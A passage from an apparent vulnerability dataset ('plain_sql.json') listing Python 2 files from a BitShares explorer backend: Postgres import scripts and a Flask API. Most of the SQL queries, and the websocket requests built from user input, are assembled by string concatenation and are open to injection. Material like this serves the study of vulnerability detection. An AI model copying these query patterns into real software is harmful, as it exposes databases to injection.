all_assets[x][\"result\"][i][\"id\"]\n\n        precision = 5\n        try:\n            data3 = api._get_asset(asset_id)\n            current_supply = data3[0][\"current_supply\"]\n            precision = data3[0][\"precision\"]\n            # print current_supply\n        except:\n            price = 0\n            continue\n\n        try:\n            holders = api._get_asset_holders_count(asset_id)\n            # print holders\n        except:\n            holders = 0\n            continue\n\n        if symbol == config.CORE_ASSET_SYMBOL:\n            type_ = \"Core Token\"\n        elif all_assets[x][\"result\"][i][\"issuer\"] == \"1.2.0\":\n            type_ = \"SmartCoin\"\n        else:\n            type_ = \"User Issued\"\n        #print all_assets[x][\"result\"][i]\n\n        try:\n            data = api._get_volume(config.CORE_ASSET_SYMBOL, symbol)\n        except:\n            continue\n\n        #print symbol\n        #print data[\"quote_volume\"]\n\n        try:\n            data2 = api._get_ticker(config.CORE_ASSET_SYMBOL, symbol)\n            price = data2[\"latest\"]\n            #print price\n\n            if str(price) == 'inf':\n               continue\n            #    exit\n\n            #print price\n        except:\n            price = 0\n            continue\n\n        mcap = int(current_supply) * float(price)\n\n        query = \"INSERT INTO assets (aname, aid, price, volume, mcap, type, current_supply, holders, wallettype, precision) VALUES('\"+symbol+\"', '\"+asset_id+\"', '\"+price+\"', '\"+data['base_volume']+\"', '\"+str(mcap)+\"', '\"+type_+\"', '\"+str(current_supply)+\"', '\"+str(holders)+\"', '','\"+str(precision)+\"')\"\n        #query = \"INSERT INTO assets (aname, aid, price, volume, mcap, type, current_supply, holders) VALUES('\" + symbol + \"', '\" + asset_id + \"', '\" + price + \"', '0', '\" + str(mcap) + \"', '\" + type_ + \"', '\" + str(current_supply) + \"', '\" + str(holders) + \"')\"\n\n        print query\n        cur.execute(query)\n        con.commit()\n\n\n# with updated volume, add stats\nquery = \"select sum(volume) from assets WHERE aname!='BTS'\"\ncur.execute(query)\nresults = cur.fetchone()\nvolume = results[0]\n\nquery = \"select sum(mcap) from assets\"\ncur.execute(query)\nresults = cur.fetchone()\nmarket_cap = results[0]\n\nquery = \"INSERT INTO stats (type, value, date) VALUES('volume_bts', '\"+str(int(round(volume)))+\"', NOW())\"\nprint query\ncur.execute(query)\ncon.commit()\n\n\"\"\"query = \"INSERT INTO stats (type, value, date) VALUES('market_cap_bts', '\"+str(int(round(market_cap)))+\"', NOW())\" # out of range for bigint, fix.\nprint query\ncur.execute(query)\ncon.commit()\n\"\"\"\n\n# insert core token manually\ndata3 = api._get_asset(config.CORE_ASSET_ID)\ncurrent_supply = data3[0][\"current_supply\"]\n\nholders = api._get_asset_holders_count(config.CORE_ASSET_ID)\n\nmcap = int(current_supply)\n\nquery = \"INSERT INTO assets (aname, aid, price, volume, mcap, type, current_supply, holders, wallettype) VALUES('BTS', '1.3.0', '1', '\"+str(volume)+\"', '\"+str(mcap)+\"', 'Core Token', '\" + str(current_supply) + \"', '\" + str(holders) + \"', '')\"\ncur.execute(query)\ncon.commit()\n\ncur.close()\ncon.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/myneworder/braundex-python-api-backend/blob/7b0261ff9db2a69e0b67e843b536494b1941b360",
        "file_path": "/postgres/import_holders.py",
        "source": "#!/usr/bin/env python2\nimport json\nimport os\nimport time\nimport urllib\n\nimport psycopg2\nfrom websocket import create_connection\n\nimport config\n\n\nws = create_connection(config.WEBSOCKET_URL)\n\ncon = psycopg2.connect(**config.POSTGRES)\ncur = con.cursor()\n\nquery = \"TRUNCATE holders\"\ncur.execute(query)\nquery = \"ALTER SEQUENCE holders_hid_seq RESTART WITH 1\"\ncur.execute(query)\ncon.commit()\n\nws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_account_count\",[]]}')\nresult = ws.recv()\nj = json.loads(result)\naccount_count = int(j[\"result\"])\n\nfor ac in range(0, account_count):\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"1.2.' + str(ac) + '\"]]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    try:\n        account_id = j[\"result\"][0][\"id\"]\n        account_name = j[\"result\"][0][\"name\"]\n    except:\n        continue\n\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_account_balances\",[\"' + account_id + '\", [\"1.3.0\"]]]}')\n    result3 = ws.recv()\n    jb = json.loads(result3)\n\n    if jb[\"result\"][0][\"amount\"] == 0:\n        continue\n    else:\n        amount = jb[\"result\"][0][\"amount\"]\n\n        # add total_core_in_orders to the sum\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"' + j[\"result\"][0][\"statistics\"] + '\"]]]}')\n        result = ws.recv()\n        js = json.loads(result)\n\n        try:\n            total_core_in_orders = js[\"result\"][0][\"total_core_in_orders\"]\n        except:\n            total_core_in_orders = 0\n\n        amount = int(amount) + int(total_core_in_orders)\n\n        voting_account = j[\"result\"][0][\"options\"][\"voting_account\"]\n        query = \"INSERT INTO holders (account_id, account_name, amount, voting_as) VALUES('\"+account_id+\"', '\"+account_name+\"','\"+str(amount)+\"', '\"+voting_account+\"')\"\n        cur.execute(query)\n        con.commit()\n\ncon.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/myneworder/braundex-python-api-backend/blob/7b0261ff9db2a69e0b67e843b536494b1941b360",
        "file_path": "/postgres/import_markets.py",
        "source": "#!/usr/bin/env python2\nimport json\n\nimport psycopg2\nfrom websocket import create_connection\n\nimport api\nimport config\n\n\nws = create_connection(config.WEBSOCKET_URL)\n\ncon = psycopg2.connect(**config.POSTGRES)\ncur = con.cursor()\n\nquery = \"TRUNCATE markets\"\ncur.execute(query)\n\nquery = \"ALTER SEQUENCE markets_id_seq RESTART WITH 1\"\ncur.execute(query)\n\ncon.commit()\n\nquery = \"SELECT * FROM assets WHERE volume > 0 ORDER BY volume DESC\"\ncur.execute(query)\nrows = cur.fetchall()\n\nfor row in rows:\n    all_assets = []\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"list_assets\",[\"AAAAA\", 100]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    all_assets.append(j);\n\n    len_result = len(j[\"result\"])\n\n    while len_result == 100:\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"list_assets\",[\"'+j[\"result\"][99][\"symbol\"]+'\", 100]]}')\n        result = ws.recv()\n        j = json.loads(result)\n        len_result = len(j[\"result\"])\n        all_assets.append(j);\n\n    try:\n        for x in range (0, len(all_assets)):\n            for i in range(0, 100):\n\n                symbol =  all_assets[x][\"result\"][i][\"symbol\"]\n                id_ = all_assets[x][\"result\"][i][\"id\"]\n\n                try:\n                    data = api._get_volume(symbol, row[1])\n                    volume = data[\"base_volume\"]\n                except:\n                    volume = 0\n                    continue\n\n                try:\n                    data2 = api._get_ticker(symbol, row[1])\n                    price = data2[\"latest\"]\n                    #print price\n                except:\n                    price = 0\n                    continue\n\n                print row[1] + \" / \" + symbol + \" vol: \" + str(volume) + \" price: \" + str(price)\n                #if symbol == \"COMPUCEEDS\":\n                #    exit\n\n                # this was an attempt to sum up volume of not bts crosses to calculate total DEX volume, disabled by now(need better math to convert to bts)\n                \"\"\"\n                if float(data[\"base_volume\"]) > 0 and float(row[3]) > 0 and row[1] != \"BTS\" and symbol != \"BTS\":\n                    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + symbol + '\"], 0]]}')\n                    result_l = ws.recv()\n                    j_l = json.loads(result_l)\n                    base_id = j_l[\"result\"][0][\"id\"]\n                    base_precision = 10 ** float(j_l[\"result\"][0][\"precision\"])\n                    # print base_id\n\n                    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + row[1] + '\"], 0]]}')\n                    result_l = ws.recv()\n                    j_l = json.loads(result_l)\n                    # print j_l\n                    quote_id = j_l[\"result\"][0][\"id\"]\n                    quote_precision = 10 ** float(j_l[\"result\"][0][\"precision\"])\n\n                    print float(row[4])\n                    print float(data['base_volume'])\n                    print float(row[3])\n                    sum_volume = float(row[4]) + (float(data['base_volume']) * float(base_precision) / float(data['quote_volume']) * float(quote_precision)) / float(row[3])\n                    print sum_volume\n                    exit\n                    query_u = \"UPDATE assets SET volume='\"+str(sum_volume)+\"' WHERE id=\"+str(row[0])\n                    #print query_u\n                    cur.execute(query_u)\n                    con.commit()\n                \"\"\"\n\n                if float(price) > 0 and float(volume) > 0:\n                    query = \"INSERT INTO markets (pair, asset_id, price, volume, aid) VALUES('\"+row[1]+ \"/\" + symbol+\"', '\"+str(row[0])+\"', '\"+str(float(price))+\"', '\"+str(float(volume))+\"', '\"+row[2]+\"')\"\n                    print query\n                    cur.execute(query)\n                    con.commit()\n\n    except:\n        continue\n\n\ncur.close()\ncon.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/myneworder/braundex-python-api-backend/blob/7b0261ff9db2a69e0b67e843b536494b1941b360",
        "file_path": "/postgres/import_realtime_ops.py",
        "source": "#!/usr/bin/env python2\nimport json\nimport thread\n\nimport psycopg2\nimport websocket\n\nimport api\nimport config\n\n\ndef on_message(ws, message):\n    #print(message)\n    j = json.loads(message)\n    try:\n        #print j[\"params\"][1][0][0][\"id\"]\n        id_ = j[\"params\"][1][0][0][\"id\"]\n        #print id_[:4]\n        if id_[:4] == \"2.9.\":\n            #print j[\"params\"][1][0][0]\n            data = api._get_object(id_)\n            #print data[0]\n            account_id = data[0][\"account\"]\n            data_a = api._account_name(account_id)\n\n            #print data_a[0][\"name\"]\n            account_name = data_a[0][\"name\"]\n\n            data2 = api._get_object(data[0]['operation_id'])\n            block_num = data2[0][\"block_num\"]\n\n            op_type = data2[0][\"op\"][0]\n\n            #print block_num\n            trx_in_block =  data2[0][\"trx_in_block\"]\n            op_in_trx =  data2[0][\"op_in_trx\"]\n\n            con = psycopg2.connect(**config.POSTGRES)\n            cur = con.cursor()\n            query = \"INSERT INTO ops (oh, ath, block_num, trx_in_block, op_in_trx, datetime, account_id, op_type, account_name) VALUES('\"+id_+\"', '\"+data[0][\"operation_id\"]+\"', '\"+str(block_num)+\"', '\"+str(trx_in_block)+\"', '\"+str(op_in_trx)+\"', NOW(), '\"+account_id+\"', '\"+str(op_type)+\"', '\"+account_name+\"')\"\n            print query\n            cur.execute(query)\n            con.commit()\n\n    except:\n        pass\n\n\ndef on_error(ws, error):\n    print(error)\n    #print \"\"\n\n\ndef on_close(ws):\n    print(\"### closed ###\")\n\n\ndef on_open(ws):\n    def run(*args):\n        ws.send('{\"method\": \"call\", \"params\": [1, \"database\", []], \"id\": 3}')\n        ws.send('{\"method\": \"call\", \"params\": [2, \"set_subscribe_callback\", [5, true]], \"id\": 6}')\n\n    thread.start_new_thread(run, ())\n\n\nif __name__ == \"__main__\":\n    websocket.enableTrace(True)\n    ws = websocket.WebSocketApp(config.WEBSOCKET_URL,\n                                on_message=on_message,\n                                on_error=on_error,\n                                on_close=on_close)\n    ws.on_open = on_open\n\n    ws.run_forever()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/myneworder/braundex-python-api-backend/blob/7b0261ff9db2a69e0b67e843b536494b1941b360",
        "file_path": "/postgres/import_referrers.py",
        "source": "#!/usr/bin/env python2\nimport json\nimport os\nimport time\nimport urllib\n\nimport psycopg2\nfrom websocket import create_connection\n\nimport config\n\n\nws = create_connection(config.WEBSOCKET_URL)\n\ncon = psycopg2.connect(**config.POSTGRES)\ncur = con.cursor()\n\n\n#query = \"TRUNCATE referrers\"\n#cur.execute(query)\n#query = \"ALTER SEQUENCE referrers_rid_seq RESTART WITH 1\"\n#cur.execute(query)\n#con.commit()\n\nquery = \"SELECT rid FROM referrers ORDER BY rid DESC LIMIT 1\"\ncur.execute(query)\nin_database = cur.fetchone() or [0]\n\nws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_account_count\",[]]}')\nresult = ws.recv()\nj = json.loads(result)\naccount_count = int(j[\"result\"])\n\nprint account_count\n\nfor ac in range(in_database[0], account_count):\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"1.2.' + str(ac) + '\"]]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    try:\n        account_id = j[\"result\"][0][\"id\"]\n        account_name = j[\"result\"][0][\"name\"]\n\n        referrer = j[\"result\"][0][\"referrer\"]\n        referrer_rewards_percentage = j[\"result\"][0][\"referrer_rewards_percentage\"]\n        lifetime_referrer = j[\"result\"][0][\"lifetime_referrer\"]\n        lifetime_referrer_fee_percentage = j[\"result\"][0][\"lifetime_referrer_fee_percentage\"]\n\n        print account_id\n        print referrer\n        print lifetime_referrer\n        print \"\"\n\n        query = \"INSERT INTO referrers (account_id, account_name, referrer, referrer_rewards_percentage, lifetime_referrer, lifetime_referrer_fee_percentage) \" \\\n                \"VALUES('\"+account_id+\"', '\"+account_name+\"','\"+referrer+\"', '\"+str(referrer_rewards_percentage)+\"','\"+lifetime_referrer+\"', '\"+str(lifetime_referrer_fee_percentage)+\"')\"\n        cur.execute(query)\n        con.commit()\n\n    except:\n        continue\n\ncon.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/bitshares/bitshares-explorer-api/blob/7b0261ff9db2a69e0b67e843b536494b1941b360",
        "file_path": "/api.py",
        "source": "import datetime\nimport json\nimport math\nimport os\n\nfrom flask import Flask, jsonify, request\nfrom flask_cors import CORS, cross_origin\nimport psycopg2\nfrom websocket import create_connection\n\nimport config\n\n\napp = Flask(__name__)\nCORS(app)\n\n\nws = create_connection(config.WEBSOCKET_URL)\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0')\n\n\n@app.route('/header')\ndef header():\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_dynamic_global_properties\",[]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"2.3.0\"]]]}')\n    result2 = ws.recv()\n    j2 = json.loads(result2)\n\n    current_supply = j2[\"result\"][0][\"current_supply\"]\n    confidental_supply = j2[\"result\"][0][\"confidential_supply\"]\n\n    market_cap = int(current_supply) + int(confidental_supply)\n    j[\"result\"][\"bts_market_cap\"] = int(market_cap/100000000)\n    #print j[\"result\"][0][\"bts_market_cap\"]\n\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_24_volume\",[\"BTS\", \"OPEN.BTC\"]]}')\n    result3 = ws.recv()\n    j3 = json.loads(result3)\n\n    j[\"result\"][\"quote_volume\"] = j3[\"result\"][\"quote_volume\"]\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_global_properties\",[]]}')\n    result5 = ws.recv()\n    j5 = json.loads(result5)\n    #print j5\n\n    commitee_count = len(j5[\"result\"][\"active_committee_members\"])\n    witness_count = len(j5[\"result\"][\"active_witnesses\"])\n\n    j[\"result\"][\"commitee_count\"] = commitee_count\n    j[\"result\"][\"witness_count\"] = witness_count\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/account_name')\ndef account_name():\n    account_id = request.args.get('account_id')\n    return jsonify(_account_name(account_id))\n\n\ndef _account_name(account_id):\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_accounts\",[[\"'+account_id+'\"]]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n    return j[\"result\"]\n\n\n@app.route('/operation')\ndef get_operation():\n    operation_id = request.args.get('operation_id')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"'+operation_id+'\"]]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_dynamic_global_properties\",[]]}')\n    result2 =  ws.recv()\n    j2 = json.loads(result2)\n\n    if not j[\"result\"][0]:\n        j[\"result\"][0] = {}\n\n    j[\"result\"][0][\"accounts_registered_this_interval\"] = j2[\"result\"][\"accounts_registered_this_interval\"]\n\n    # get market cap\n    ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"2.3.0\"]]]}')\n    result2 = ws.recv()\n    j2 = json.loads(result2)\n\n    current_supply = j2[\"result\"][0][\"current_supply\"]\n    confidental_supply = j2[\"result\"][0][\"confidential_supply\"]\n\n    market_cap = int(current_supply) + int(confidental_supply)\n    j[\"result\"][0][\"bts_market_cap\"] = int(market_cap/100000000)\n    #print j[\"result\"][0][\"bts_market_cap\"]\n\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_24_volume\",[\"BTS\", \"OPEN.BTC\"]]}')\n    result3 = ws.recv()\n    j3 = json.loads(result3)\n    #print j3[\"result\"][\"quote_volume\"]\n    j[\"result\"][0][\"quote_volume\"] = j3[\"result\"][\"quote_volume\"]\n\n    # TODO: making this call with every operation is not very efficient as this are static properties\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_global_properties\",[]]}')\n    result5 = ws.recv()\n    j5 = json.loads(result5)\n\n    commitee_count = len(j5[\"result\"][\"active_committee_members\"])\n    witness_count = len(j5[\"result\"][\"active_witnesses\"])\n\n    j[\"result\"][0][\"commitee_count\"] = commitee_count\n    j[\"result\"][0][\"witness_count\"] = witness_count\n\n\n    #print j['result']\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/operation_full')\ndef operation_full():\n    # lets connect the operations to a full node\n    #full_websocket_url = \"ws://node.testnet.bitshares.eu:18092/ws\"\n    ws = create_connection(config.FULL_WEBSOCKET_URL)\n\n    operation_id = request.args.get('operation_id')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"'+operation_id+'\"]]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_dynamic_global_properties\",[]]}')\n    result2 =  ws.recv()\n    j2 = json.loads(result2)\n\n    if not j[\"result\"][0]:\n        j[\"result\"][0] = {}\n\n    j[\"result\"][0][\"accounts_registered_this_interval\"] = j2[\"result\"][\"accounts_registered_this_interval\"]\n\n    # get market cap\n    ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"2.3.0\"]]]}')\n    result2 = ws.recv()\n    j2 = json.loads(result2)\n\n    current_supply = j2[\"result\"][0][\"current_supply\"]\n    confidental_supply = j2[\"result\"][0][\"confidential_supply\"]\n\n    market_cap = int(current_supply) + int(confidental_supply)\n    j[\"result\"][0][\"bts_market_cap\"] = int(market_cap/100000000)\n    #print j[\"result\"][0][\"bts_market_cap\"]\n\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_24_volume\",[\"BTS\", \"OPEN.BTC\"]]}')\n    result3 = ws.recv()\n    j3 = json.loads(result3)\n    #print j3[\"result\"][\"quote_volume\"]\n    j[\"result\"][0][\"quote_volume\"] = j3[\"result\"][\"quote_volume\"]\n\n    # TODO: making this call with every operation is not very efficient as this are static properties\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_global_properties\",[]]}')\n    result5 = ws.recv()\n    j5 = json.loads(result5)\n\n    commitee_count = len(j5[\"result\"][\"active_committee_members\"])\n    witness_count = len(j5[\"result\"][\"active_witnesses\"])\n\n    j[\"result\"][0][\"commitee_count\"] = commitee_count\n    j[\"result\"][0][\"witness_count\"] = witness_count\n\n\n    #print j['result']\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/accounts')\ndef accounts():\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  ws.recv()\n    #print  result2\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"asset\",[]]}')\n\n    asset =  ws.recv()\n    asset_j = json.loads(asset)\n\n    asset_api = str(asset_j[\"result\"])\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":['+asset_api+',\"get_asset_holders\",[\"1.3.0\", 0, 100]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    #print j[\"result\"]\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/full_account')\ndef full_account():\n    account_id = request.args.get('account_id')\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_full_accounts\",[[\"'+account_id+'\"], 0]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    #print j[\"result\"]\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/assets')\ndef assets():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT * FROM assets WHERE volume > 0 ORDER BY volume DESC\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    #print results\n    return jsonify(results)\n\n\n@app.route('/fees')\ndef fees():\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_global_properties\",[]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    #print j[\"result\"]\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/account_history')\ndef account_history():\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  ws.recv()\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"history\",[]]}')\n    history =  ws.recv()\n    history_j = json.loads(history)\n    history_api = str(history_j[\"result\"])\n    #print history_api\n\n    account_id = request.args.get('account_id')\n\n    if not isObject(account_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_account_names\",[[\"' + account_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n\n        account_id = j_l[\"result\"][0][\"id\"]\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":['+history_api+',\"get_account_history\",[\"'+account_id+'\", \"1.11.1\", 20, \"1.11.9999999999\"]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    if(len(j[\"result\"]) > 0):\n        for c in range(0, len(j[\"result\"])):\n            ws.send(\n                '{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_block_header\",[' + str(j[\"result\"][c][\"block_num\"]) + ', 0]]}')\n            result2 = ws.recv()\n            j2 = json.loads(result2)\n\n            j[\"result\"][c][\"timestamp\"] = j2[\"result\"][\"timestamp\"]\n            j[\"result\"][c][\"witness\"] = j2[\"result\"][\"witness\"]\n    try:\n        return jsonify(j[\"result\"])\n    except:\n        return {}\n\n\n@app.route('/get_asset')\ndef get_asset():\n    asset_id = request.args.get('asset_id')\n    return jsonify(_get_asset(asset_id))\n\n\ndef _get_asset(asset_id):\n    if not isObject(asset_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + asset_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n        asset_id = j_l[\"result\"][0][\"id\"]\n\n    #print asset_id\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_assets\",[[\"' + asset_id + '\"], 0]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    dynamic_asset_data_id =  j[\"result\"][0][\"dynamic_asset_data_id\"]\n\n    ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"'+dynamic_asset_data_id+'\"]]]}')\n    result2 = ws.recv()\n    j2 = json.loads(result2)\n    #print j2[\"result\"][0][\"current_supply\"]\n\n    j[\"result\"][0][\"current_supply\"] = j2[\"result\"][0][\"current_supply\"]\n    j[\"result\"][0][\"confidential_supply\"] = j2[\"result\"][0][\"confidential_supply\"]\n    #print j[\"result\"]\n\n    j[\"result\"][0][\"accumulated_fees\"] = j2[\"result\"][0][\"accumulated_fees\"]\n    j[\"result\"][0][\"fee_pool\"] = j2[\"result\"][0][\"fee_pool\"]\n\n    issuer = j[\"result\"][0][\"issuer\"]\n    ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"'+issuer+'\"]]]}')\n    result3 = ws.recv()\n    j3 = json.loads(result3)\n    j[\"result\"][0][\"issuer_name\"] = j3[\"result\"][0][\"name\"]\n\n    return j[\"result\"]\n\n\n@app.route('/get_asset_and_volume')\ndef get_asset_and_volume():\n    asset_id = request.args.get('asset_id')\n\n    if not isObject(asset_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + asset_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n        asset_id = j_l[\"result\"][0][\"id\"]\n\n    #print asset_id\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_assets\",[[\"' + asset_id + '\"], 0]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    dynamic_asset_data_id =  j[\"result\"][0][\"dynamic_asset_data_id\"]\n\n    ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"'+dynamic_asset_data_id+'\"]]]}')\n    result2 = ws.recv()\n    j2 = json.loads(result2)\n    #print j2[\"result\"][0][\"current_supply\"]\n\n    j[\"result\"][0][\"current_supply\"] = j2[\"result\"][0][\"current_supply\"]\n    j[\"result\"][0][\"confidential_supply\"] = j2[\"result\"][0][\"confidential_supply\"]\n    #print j[\"result\"]\n\n    j[\"result\"][0][\"accumulated_fees\"] = j2[\"result\"][0][\"accumulated_fees\"]\n    j[\"result\"][0][\"fee_pool\"] = j2[\"result\"][0][\"fee_pool\"]\n\n    issuer = j[\"result\"][0][\"issuer\"]\n    ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"'+issuer+'\"]]]}')\n    result3 = ws.recv()\n    j3 = json.loads(result3)\n    j[\"result\"][0][\"issuer_name\"] = j3[\"result\"][0][\"name\"]\n\n\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT volume, mcap FROM assets WHERE aid='\"+asset_id+\"'\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    try:\n        j[\"result\"][0][\"volume\"] = results[0][0]\n        j[\"result\"][0][\"mcap\"] = results[0][1]\n    except:\n        j[\"result\"][0][\"volume\"] = 0\n        j[\"result\"][0][\"mcap\"] = 0\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/block_header')\ndef block_header():\n    block_num = request.args.get('block_num')\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_block_header\",[' + block_num + ', 0]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    #print j[\"result\"]\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_block')\ndef get_block():\n    block_num = request.args.get('block_num')\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_block\",[' + block_num + ', 0]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    #print j[\"result\"]\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_ticker')\ndef get_ticker():\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n    return jsonify(_get_ticker(base, quote))\n\n\ndef _get_ticker(base, quote):\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_ticker\",[\"' + base + '\", \"'+quote+'\"]]}')\n    result = ws.recv()\n    j = json.loads(result)\n    return j[\"result\"]\n\n\n@app.route('/get_volume')\ndef get_volume():\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n    return jsonify(_get_volume(base, quote))\n\n\ndef _get_volume(base, quote):\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_24_volume\",[\"' + base + '\", \"'+quote+'\"]]}')\n    result = ws.recv()\n    j = json.loads(result)\n    return j[\"result\"]\n\n\n@app.route('/lastnetworkops')\ndef lastnetworkops():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT * FROM ops ORDER BY block_num DESC LIMIT 10\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    return jsonify(results)\n\n\n@app.route('/get_object')\ndef get_object():\n    obj = request.args.get('object')\n    return jsonify(_get_object(obj))\n\n\ndef _get_object(obj):\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"'+obj+'\"]]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n    return j[\"result\"]\n\n\n@app.route('/get_asset_holders_count')\ndef get_asset_holders_count():\n    asset_id = request.args.get('asset_id')\n    return jsonify(_get_asset_holders_count(asset_id))\n\n\ndef _get_asset_holders_count(asset_id):\n    if not isObject(asset_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + asset_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n        asset_id = j_l[\"result\"][0][\"id\"]\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  ws.recv()\n    #print  result2\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"asset\",[]]}')\n\n    asset =  ws.recv()\n    asset_j = json.loads(asset)\n\n    asset_api = str(asset_j[\"result\"])\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":['+asset_api+',\"get_asset_holders_count\",[\"'+asset_id+'\"]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    return j[\"result\"]\n\n\n@app.route('/get_asset_holders')\ndef get_asset_holders():\n    asset_id = request.args.get('asset_id')\n\n    if not isObject(asset_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + asset_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n        asset_id = j_l[\"result\"][0][\"id\"]\n\n    